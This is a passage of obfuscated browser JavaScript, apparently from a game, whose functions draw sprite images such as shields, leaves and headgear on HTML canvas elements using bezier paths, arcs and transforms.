			Δ.bezierCurveTo(86.5 * ᐃ, 70.34375 * ᐃ, ᐃ * 86.5, ᐃ * 70.34375, ᐃ * 92.5, ᐃ * 71.34375);
			Δ.bezierCurveTo(86 * ᐃ, 73.34375 * ᐃ, ᐃ * 86, ᐃ * 73.34375, 79.5 * ᐃ, ᐃ * 75.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * 222.5, 75.34375 * ᐃ);
			Δ.bezierCurveTo(214.5 * ᐃ, ᐃ * 76.34375, 214.5 * ᐃ, ᐃ * 76.34375, ᐃ * 206.5, 77.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 216.5, 79.34375 * ᐃ, 216.5 * ᐃ, 79.34375 * ᐃ, 226.5 * ᐃ, 81.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(116.5 * ᐃ, 100.34375 * ᐃ);
			Δ.bezierCurveTo(128 * ᐃ, ᐃ * 97.34375, 128 * ᐃ, ᐃ * 97.34375, 139.5 * ᐃ, 94.34375 * ᐃ);
			Δ.bezierCurveTo(140 * ᐃ, ᐃ * 96.84375, 140 * ᐃ, ᐃ * 96.84375, ᐃ * 140.5, 99.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(112.5 * ᐃ, 48.34375 * ᐃ);
			Δ.bezierCurveTo(115.5 * ᐃ, ᐃ * 50.84375, 115.5 * ᐃ, ᐃ * 50.84375, 118.5 * ᐃ, ᐃ * 53.34375);
			Δ.bezierCurveTo(ᐃ * 131, 50.84375 * ᐃ, 131 * ᐃ, 50.84375 * ᐃ, 143.5 * ᐃ, 48.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 216.5, ᐃ * 109.34375);
			Δ.bezierCurveTo(213 * ᐃ, ᐃ * 114.84375, 213 * ᐃ, 114.84375 * ᐃ, ᐃ * 209.5, 120.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 212, ᐃ * 118.84375, ᐃ * 212, ᐃ * 118.84375, ᐃ * 214.5, ᐃ * 117.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(86.5 * ᐃ, 133.34375 * ᐃ);
			Δ.bezierCurveTo(89 * ᐃ, 127.34375 * ᐃ, 89 * ᐃ, 127.34375 * ᐃ, 91.5 * ᐃ, ᐃ * 121.34375);
			Δ.bezierCurveTo(ᐃ * 92.5, ᐃ * 127.34375, 92.5 * ᐃ, ᐃ * 127.34375, 93.5 * ᐃ, 133.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			return Ⲇⵠ
		}

		function ᐃⲆⲆⵠΔΔⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 47 * ᐃ;
			Ⲇⵠ.height = 60 * ᐃ;
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 47;
			Ⲇⵠ.height = ᐃ * 60;
			ⵠᐃᐃ(Δ, 23.5 * ᐃ, 20.734375 * ᐃ, ᐃ * 15.132745950421556);
			ΔⲆ(Δ, ΔΔⵠᐃΔ, Ⲇᐃ[ᐃⲆΔⲆ], ᐃ * Ⲇᐃⵠᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 23.5, ᐃ * 20.734375, 18.601075237738275 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[1], ᐃ * ⵠᐃᐃⲆ);
			ⵠᐃᐃ(Δ, ᐃ * 23.5, 20.734375 * ᐃ, 11.40175425099138 * ᐃ);
			ΔⲆ(Δ, ⲆⲆⲆⲆᐃ, Ⲇᐃ[ⵠᐃⵠΔ], ᐃ * 4);
			Δ.save();
			Δ.translate(ᐃ * 23, ᐃ * 38.734375);
			Δ.rotate(ⲆⲆⲆᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -21.5, -19 * ᐃ, 43 * ᐃ, ᐃ * 38, ᐃ * ⲆΔΔᐃᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔⲆ], Ⲇᐃ[1], 4 * ᐃ);
			Δ.save();
			Δ.translate(23.5 * ᐃ, ᐃ * 43.734375);
			Δ.rotate(.5235987755982988);
			ⵠΔⵠᐃ(Δ, ⲆΔⵠⵠ, 8.06225774829855 * ᐃ, ᐃ * Δⵠᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔⲆ]);
			ⵠᐃᐃ(Δ, 23.5 * ᐃ, 35.734375 * ᐃ, ᐃ * 7.0710678118654755);
			ΔⲆ(Δ, Ⲇᐃ[3]);
			return Ⲇⵠ
		}

		function ᐃᐃΔΔᐃⲆΔ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 95;
			Ⲇⵠ.height = 85 * ᐃ;
			if (ᐃⵠⲆ == ⵠᐃ) {
				Δ.translate(7 * ᐃ, ⵠᐃⲆΔᐃᐃⲆ * ᐃ);
				Δ.scale(.9, .9);
				Δ.save();
				Ⲇᐃᐃ(Δ, ᐃ * 0, ᐃ * 5, 90 * ᐃ, ᐃ * 60, ᐃⵠᐃΔⵠ);
				ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ]);
				Δ.globalCompositeOperation = ⵠ[172];
				ⵠᐃᐃ(Δ, ᐃ * 25, 40 * ᐃ, ⵠⲆⲆᐃⵠ * ᐃ);
				Δ.fill();
				ⵠᐃᐃ(Δ, 65 * ᐃ, 40 * ᐃ, 10 * ᐃ);
				Δ.fill();
				Δ.restore();
				Δ.save();
				Ⲇᐃᐃ(Δ, 0, 0, 90 * ᐃ, ᐃ * 60, ⵠⲆⲆᐃⵠ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalCompositeOperation = ⵠ[172];
				ⵠᐃᐃ(Δ, 25 * ᐃ, ᐃ * 40, ᐃ * 10);
				Δ.fill();
				ⵠᐃᐃ(Δ, 65 * ᐃ, ᐃ * 40, ⲆⵠⲆⲆᐃ * ᐃ);
				Δ.fill();
				Δ.restore()
			} else ᐃΔᐃⲆ == ⵠᐃ && (Δ.scale(.8, .8), Δ.translate(ᐃ * 15, ᐃ * 33), Δ.save(), Δ.scale(.56, .56), Δ.translate(-39 * ᐃ, ᐃ * -60), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(ᐃ * 32.5, 50.642852783203125 * ᐃ), Δ.bezierCurveTo(83 * ᐃ, ᐃ * 69.64285278320312, ᐃ * 83, ᐃ * 69.64285278320312, ᐃ * 133.5, ᐃ * 88.64285278320312), Δ.bezierCurveTo(ᐃ * 93, ᐃ * 92.64285278320312, 93 * ᐃ, ᐃ * 92.64285278320312, ᐃ * 52.5, ᐃ * 96.64285278320312), Δ.bezierCurveTo(ᐃ * 30.5, ᐃ * 100.64285278320312, ᐃ * 36.5, ᐃ * 94.64285278320312, ᐃ * 32.5, ᐃ * 84.64285278320312), Δ.bezierCurveTo(21.5 * ᐃ, 45.642852783203125 * ᐃ, ᐃ * 24.5, ᐃ * 48.642852783203125, ᐃ * 31.5, ᐃ * 50.642852783203125), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ⲆⵠⲆⲆ]), Δ.beginPath(), Δ.lineCap = ⵠ[ΔⲆΔΔ], Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ], Δ.moveTo(116.5 * ᐃ, 85.64285278320312 * ᐃ), Δ.bezierCurveTo(ᐃ * 160.5, ᐃ * 67.14285278320312, ᐃ * 160.5, ᐃ * 67.14285278320312, 204.5 * ᐃ, ᐃ * 48.642852783203125), Δ.bezierCurveTo(ᐃ * 220.5, 42.642852783203125 * ᐃ, ᐃ * 208.5, 68.64285278320312 * ᐃ, 205.5 * ᐃ, 85.64285278320312 * ᐃ), Δ.bezierCurveTo(202.5 * ᐃ, ᐃ * 98.64285278320312, ᐃ * 199.5, 98.64285278320312 * ᐃ, ᐃ * 188.5, 100.64285278320312 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆⵠ]), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(166.5 * ᐃ, 68.64285278320312 * ᐃ), Δ.bezierCurveTo(ᐃ * 147.5, ᐃ * 72.64285278320312, ᐃ * 145.5, ᐃ * 73.64285278320312, 142.5 * ᐃ, 62.642852783203125 * ᐃ), Δ.bezierCurveTo(ᐃ * 121.5, 12.642852783203125 * ᐃ, 122.5 * ᐃ, 5.642852783203125 * ᐃ, ᐃ * 117.5, 15.642852783203125 * ᐃ), Δ.bezierCurveTo(ᐃ * 105.5, ᐃ * 40.642852783203125, 105.5 * ᐃ, ᐃ * 40.642852783203125, 93.5 * ᐃ, ᐃ * 65.64285278320312), Δ.bezierCurveTo(89.5 * ᐃ, 74.64285278320312 * ᐃ, 84.5 * ᐃ, 72.64285278320312 * ᐃ, 73.5 * ᐃ, 74.64285278320312 * ᐃ), Δ.bezierCurveTo(98 * ᐃ, ᐃ * 87.64285278320312, 98 * ᐃ, 87.64285278320312 * ᐃ, 122.5 * ᐃ, 100.64285278320312 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[1]), Δ.restore(), Δ.save(), Ⲇᐃᐃ(Δ, ⵠᐃⲆᐃ, Δᐃᐃᐃᐃⵠⵠ * ᐃ, ᐃ * 90, 50 * ᐃ, ⵠⵠΔⲆᐃ * ᐃ), ΔⲆ(Δ, Ⲇᐃ[0]), Ⲇᐃᐃ(Δ, ΔⲆⲆ, 10 * ᐃ, ᐃ * 90, 50 * ᐃ, ᐃ * 10), ΔⲆ(Δ, Ⲇᐃ[ΔⵠⲆΔ]), Δ.globalCompositeOperation = ⵠ[172], ⵠᐃᐃ(Δ, 25 * ᐃ, 40 * ᐃ, 10 * ᐃ), Δ.fill(), ⵠᐃᐃ(Δ, ᐃ * 65, ᐃ * 40, 10 * ᐃ), Δ.fill(), Δ.restore());
			return Ⲇⵠ
		}

		function ΔⵠΔⲆⵠⲆⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 105;
			Ⲇⵠ.height = ᐃ * 144;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠᐃⵠΔ;
			Δ.translate(ᐃ * -5, ᐃ * 0);
			Δ.save();
			Δ.translate(52.5 * ᐃ, ᐃ * 91.5);
			Ⲇᐃᐃ(Δ, ᐃ * -4.5, ᐃ * -39, 9 * ᐃ, ᐃ * 78, ᐃ * ᐃⲆⵠΔ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔⲆⵠⲆ], ᐃ * ΔⲆΔᐃ);
			Δ.save();
			Δ.translate(53 * ᐃ, 36 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -29, ᐃ * -17.5, ᐃ * 58, 35 * ᐃ, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ᐃⵠΔ], ⲆⵠΔⵠ * ᐃ);
			Δ.save();
			Δ.translate(53.5 * ᐃ, ᐃ * 35.5);
			Ⲇᐃᐃ(Δ, ᐃ * -26.5, ᐃ * -15, ᐃ * 53, 30 * ᐃ, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ], Ⲇᐃ[0], ⵠᐃΔΔ * ᐃ);
			Δ.translate(ᐃ * ⵠᐃⲆΔ, ᐃ * 0);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(ᐃ * 52.5, 91.5 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -4.5, ᐃ * -39, ᐃ * ᐃⵠⲆΔⲆᐃⲆ, ᐃ * 78, 5 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⲆⵠᐃ], ΔᐃⲆΔ * ᐃ);
			Δ.save();
			Δ.translate(53 * ᐃ, ᐃ * 36);
			Ⲇᐃᐃ(Δ, ᐃ * -29, ᐃ * -17.5, 58 * ᐃ, ᐃ * 35, ᐃ * ᐃⲆⵠⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠΔ], Ⲇᐃ[ΔᐃⵠⵠⲆ], ᐃ * 4);
			Δ.save();
			Δ.translate(53.5 * ᐃ, 35.5 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -26.5, ᐃ * -ⵠⲆΔⲆᐃᐃⲆ, 53 * ᐃ, 30 * ᐃ, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⵠ], Ⲇᐃ[ⲆᐃⲆᐃ], ᐃ * ᐃⵠⵠΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 49, ᐃ * 60.5);
			Δ.bezierCurveTo(44 * ᐃ, ᐃ * 56.5, 44 * ᐃ, 56.5 * ᐃ, ᐃ * 39, ᐃ * 52.5);
			Δ.bezierCurveTo(39 * ᐃ, 46.5 * ᐃ, 39 * ᐃ, 46.5 * ᐃ, ᐃ * 39, 40.5 * ᐃ);
			Δ.bezierCurveTo(44 * ᐃ, 44 * ᐃ, ᐃ * 44, ᐃ * 44, ᐃ * 49, 47.5 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 49, ᐃ * 54, ᐃ * 49, 54 * ᐃ, 49 * ᐃ, ᐃ * 60.5);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[ΔᐃⲆᐃ], ᐃ * ᐃⲆΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 66, 40.5 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 66, 46.5 * ᐃ, ᐃ * 66, 46.5 * ᐃ, ᐃ * 66, 52.5 * ᐃ);
			Δ.bezierCurveTo(60.5 * ᐃ, ᐃ * 56.5, 60.5 * ᐃ, ᐃ * 56.5, 55 * ᐃ, ᐃ * 60.5);
			Δ.bezierCurveTo(56 * ᐃ, 53 * ᐃ, 56 * ᐃ, ᐃ * 53, ᐃ * 57, ᐃ * 45.5);
			Δ.bezierCurveTo(ᐃ * 61.5, ᐃ * 43, ᐃ * 61.5, 43 * ᐃ, ᐃ * 66, ᐃ * 40.5);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[6], 3 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(52 * ᐃ, 33.5 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 55.5, 41 * ᐃ, 55.5 * ᐃ, ᐃ * 41, ᐃ * 59, ᐃ * 48.5);
			Δ.bezierCurveTo(ᐃ * 56, 58 * ᐃ, ᐃ * 56, ᐃ * 58, ᐃ * 53, ᐃ * 67.5);
			Δ.bezierCurveTo(ᐃ * 49, ᐃ * 58, 49 * ᐃ, ᐃ * 58, ᐃ * 45, 48.5 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 48.5, ᐃ * 41, 48.5 * ᐃ, ᐃ * 41, 52 * ᐃ, ᐃ * 33.5);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠᐃᐃⲆ], Ⲇᐃ[ⲆⵠⵠⲆΔ], ᐃ * 3);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(52 * ᐃ, ᐃ * 47.5);
			Δ.bezierCurveTo(ᐃ * 54.5, 50.5 * ᐃ, 54.5 * ᐃ, ᐃ * 50.5, ᐃ * 57, ᐃ * 53.5);
			Δ.bezierCurveTo(ᐃ * 55, ᐃ * 60, ᐃ * 55, ᐃ * 60, ᐃ * 53, 66.5 * ᐃ);
			Δ.bezierCurveTo(50.5 * ᐃ, 61 * ᐃ, ᐃ * 50.5, 61 * ᐃ, ᐃ * 48, 55.5 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 50, 52 * ᐃ, 50 * ᐃ, ᐃ * 52, 52 * ᐃ, 48.5 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔΔⲆᐃ], Ⲇᐃ[ⲆⲆⲆΔᐃ], 3 * ᐃ);
			return Ⲇⵠ
		}

		function ΔᐃⲆⵠΔᐃΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 142;
			Ⲇⵠ.height = 118 * ᐃ;
			Δ.save();
			Δ.translate(ᐃ * 70.16665649414062, 38.20831298828125 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -58.5, ᐃ * -27.5, 117 * ᐃ, ᐃ * 55, ᐃ * 20);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ], Ⲇᐃ[1], ᐃ * 4);
			Δ.save();
			Δ.translate(ᐃ * 70, 42.70831298828125 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -61, -ⵠΔⵠⵠᐃ * ᐃ, ᐃ * 122, ᐃ * 40, ᐃ * 20);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[1], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(123 * ᐃ, 70.375 * ᐃ);
			Δ.bezierCurveTo(115 * ᐃ, ᐃ * 99.375, ᐃ * 119, 85.375 * ᐃ, 115 * ᐃ, 100.375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 112, 116.375 * ᐃ, 117 * ᐃ, 109.375 * ᐃ, 131 * ᐃ, 100.375 * ᐃ);
			Δ.bezierCurveTo(131 * ᐃ, 83.375 * ᐃ, ᐃ * 131, 83.375 * ᐃ, 131 * ᐃ, 66.375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆ], Ⲇᐃ[1], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ⵠⲆᐃⵠⲆᐃΔ * ᐃ, ᐃ * 68.375);
			Δ.bezierCurveTo(11.166656494140625 * ᐃ, 84.375 * ᐃ, ⵠΔᐃⲆᐃᐃⲆ * ᐃ, ᐃ * 99.375, ΔⲆⵠⲆⲆ * ᐃ, 100.375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 35, 113.375 * ᐃ, 27 * ᐃ, 110.375 * ᐃ, 25 * ᐃ, ᐃ * 95.375);
			Δ.bezierCurveTo(ᐃ * 16, ᐃ * 68.375, ᐃ * ᐃⵠΔᐃᐃⵠⵠ, ᐃ * 69.375, ᐃ * 17, ᐃ * 68.375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔⲆ], Ⲇᐃ[1], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(46 * ᐃ, 32.375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 43, 8.375 * ᐃ, ᐃ * 45, ᐃ * 7.375, 56 * ᐃ, ᐃ * 6.375);
			Δ.bezierCurveTo(105 * ᐃ, 4.375 * ᐃ, 102 * ᐃ, ᐃ * 6.375, ᐃ * 97, 32.375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 138, ᐃ * 43.375, 133 * ᐃ, ᐃ * 45.375, ᐃ * 133, 58.375 * ᐃ);
			Δ.bezierCurveTo(133 * ᐃ, ᐃ * 85.375, ᐃ * 125, ᐃ * 74.375, ᐃ * 111, 70.375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 70, 69.875 * ᐃ, 29 * ᐃ, 69.375 * ᐃ, 29 * ᐃ, 69.375 * ᐃ);
			Δ.bezierCurveTo(ᐃⵠⵠᐃᐃ * ᐃ, ᐃ * 84.375, 7 * ᐃ, 70.375 * ᐃ, ᐃ * ᐃⲆⲆᐃᐃ, ᐃ * 59.375);
			Δ.bezierCurveTo(6 * ᐃ, ᐃ * 28.375, 32 * ᐃ, 39.375 * ᐃ, ᐃ * 44, ᐃ * 32.375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⲆ], Ⲇᐃ[1], 4 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 71, ᐃ * 44.375, 16.55294535724685 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ᐃⲆᐃ], 4 * ᐃ);
			ⵠᐃᐃ(Δ, 71 * ᐃ, 43.70831298828125 * ᐃ, 8.94427190999916 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[1], ᐃ * 4);
			return Ⲇⵠ
		}

		function ᐃΔⲆⲆᐃᐃⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 187 * ᐃ;
			Ⲇⵠ.height = 119 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔΔᐃⵠ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.translate(Δᐃᐃⵠ, ΔⲆᐃⲆ);
			Δ.moveTo(53 * ᐃ, 45 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 3, 60 * ᐃ, 11 * ᐃ, 72 * ᐃ, 19 * ᐃ, 81 * ᐃ);
			Δ.bezierCurveTo(28 * ᐃ, 82 * ᐃ, ᐃ * 24, ᐃ * 81, 29 * ᐃ, 82 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 26, ᐃ * 87, ᐃ * 28, 84 * ᐃ, 28 * ᐃ, ᐃ * 87);
			Δ.bezierCurveTo(63 * ᐃ, 101 * ᐃ, ᐃ * 92, ᐃ * 100, ᐃ * 138, 93 * ᐃ);
			Δ.bezierCurveTo(172 * ᐃ, ᐃ * 87, ᐃ * 180, ᐃ * 72, 168 * ᐃ, 62 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 154, 51 * ᐃ, ᐃ * 150, ᐃ * 50, ᐃ * 148, ᐃ * 49);
			Δ.bezierCurveTo(ᐃ * 132, ᐃ * 42, ᐃ * 90, 40 * ᐃ, 55 * ᐃ, ᐃ * 45);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔⵠ]);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.translate(0, -ΔΔⵠΔ);
			Δ.moveTo(53 * ᐃ, 45 * ᐃ);
			Δ.bezierCurveTo(3 * ᐃ, ᐃ * 60, ᐃ * 11, 72 * ᐃ, ᐃ * 19, 81 * ᐃ);
			Δ.bezierCurveTo(28 * ᐃ, 82 * ᐃ, 24 * ᐃ, 81 * ᐃ, 29 * ᐃ, ᐃ * 82);
			Δ.bezierCurveTo(26 * ᐃ, 87 * ᐃ, ᐃ * 28, 84 * ᐃ, ᐃ * 28, 87 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 63, ᐃ * 101, 92 * ᐃ, ᐃ * 100, ᐃ * 138, 93 * ᐃ);
			Δ.bezierCurveTo(172 * ᐃ, 87 * ᐃ, 180 * ᐃ, 72 * ᐃ, ᐃ * 168, 62 * ᐃ);
			Δ.bezierCurveTo(154 * ᐃ, ᐃ * 51, 150 * ᐃ, ᐃ * 50, ᐃ * 148, 49 * ᐃ);
			Δ.bezierCurveTo(132 * ᐃ, 42 * ᐃ, ᐃ * 90, ᐃ * 40, 55 * ᐃ, ᐃ * 45);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ], Ⲇᐃ[1], ΔⲆⲆⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(151 * ᐃ, 60 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 140, 36 * ᐃ, ᐃ * 137, ᐃ * 32, ᐃ * 124, ᐃ * 29);
			Δ.bezierCurveTo(98 * ᐃ, 22 * ᐃ, ᐃ * 80, 24 * ᐃ, ᐃ * 62, 28 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 42, 35 * ᐃ, 38 * ᐃ, ᐃ * 46, 34 * ᐃ, ᐃ * 58);
			Δ.bezierCurveTo(ᐃ * 53, 74 * ᐃ, ᐃ * 76, ᐃ * 76, ᐃ * 91, 78 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠⲆΔ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(37 * ᐃ, 53 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 30, 56 * ᐃ, 29 * ᐃ, 67 * ᐃ, ᐃ * 30, 68 * ᐃ);
			Δ.bezierCurveTo(94 * ᐃ, ᐃ * 108, 150 * ᐃ, 76 * ᐃ, 155 * ᐃ, ᐃ * 70);
			Δ.bezierCurveTo(ᐃ * 154, ᐃ * 60, 151 * ᐃ, 54 * ᐃ, ᐃ * 149, ᐃ * 53);
			Δ.bezierCurveTo(ᐃ * 101, 74 * ᐃ, ᐃ * 66, 66 * ᐃ, 37 * ᐃ, 53 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃΔᐃⲆΔ * ᐃ, 36 * ᐃ);
			Δ.bezierCurveTo(92 * ᐃ, ᐃ * 25, ᐃ * 86, ᐃ * 28, ᐃ * 82, ᐃ * 34);
			Δ.bezierCurveTo(ᐃ * 88, 40 * ᐃ, ᐃ * 93, 40 * ᐃ, 98 * ᐃ, ᐃ * 36);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ], Ⲇᐃ[1], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 80, ᐃ * 43);
			Δ.bezierCurveTo(69 * ᐃ, 46 * ᐃ, 67 * ᐃ, ᐃ * 52, 69 * ᐃ, ᐃ * 58);
			ΔⲆ(Δ, ⵠⵠᐃᐃᐃ, Ⲇᐃ[1], 4 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 58, ᐃ * 50, 5 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, ᐃ * 43, ᐃ * 65, ᐃ * 5);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔΔ]);
			ⵠᐃᐃ(Δ, ᐃ * 58, ᐃ * 73, ᐃ * ⵠᐃΔⵠ);
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠᐃ]);
			ⵠᐃᐃ(Δ, 58 * ᐃ, ᐃ * 50, ᐃ * 2);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃᐃ]);
			ⵠᐃᐃ(Δ, ᐃ * 43, 65 * ᐃ, ⵠⵠΔⲆ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[5]);
